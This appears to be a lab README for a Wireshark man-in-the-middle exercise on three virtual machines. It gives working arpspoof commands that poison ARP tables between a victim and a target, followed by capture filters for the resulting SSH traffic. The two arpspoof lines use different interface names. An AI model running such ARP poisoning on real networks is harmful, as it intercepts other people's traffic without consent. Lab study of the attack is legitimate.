 # Wireshark MitM Analysis Setup Guide

   ## Prerequisites
   - **OS**: Ubuntu 22.04 LTS (3 VMs: Victim, Target, Attacker).
   - **Hardware**: 2-4 GB RAM, 2 CPUs, 20 GB storage per VM.
   - **Network**: VirtualBox NAT or Host-Only network.
   - **Tools**: Wireshark, dsniff, Nmap.

   ## Installation
   1. **Update System**:
      sudo apt update && sudo apt upgrade -y
   2. **Install Tools on Attacker VM**:
      sudo apt install -y wireshark dsniff nmap
   3. **Enable IP Forwarding**:
      sudo sysctl -w net.ipv4.ip_forward=1

   ## Configuration
   - IPs: Victim (`192.168.227.164`), Target (`192.168.227.93`), Attacker (`192.168.227.50`).
	You can assign you own IPs
   - Verify connectivity:
     ping 192.168.227.93

   ## Running the Attack
   - Start Wireshark:
     sudo wireshark &
   - Perform ARP poisoning:
     sudo arpspoof -i ens33 -t 192.168.227.164 -r 192.168.227.93
     sudo arpspoof -i eth0 -t 192.168.227.93 -r 192.168.227.164
   - Generate traffic from Victim:
     ssh 192.168.227.93

   ## Analysis
   - Filter in Wireshark: `arp`, `tcp.port==22`, or `ip.src == 192.168.227.164`.
   - Save capture: `mitm_capture.pcap`.
   - Export analysis: `mitm_analysis.txt`.

   ## Notes
   - Replace IPs with your network’s values.
   - Verify interface with `ip link`.
   - See [REPORT.md](REPORT.md) for results.

   ---

   **Author**: Chinkhuselts  
   **GitHub**: [github.com/Chinkhuselts](https://github.com/Chinkhuselts)
   ```
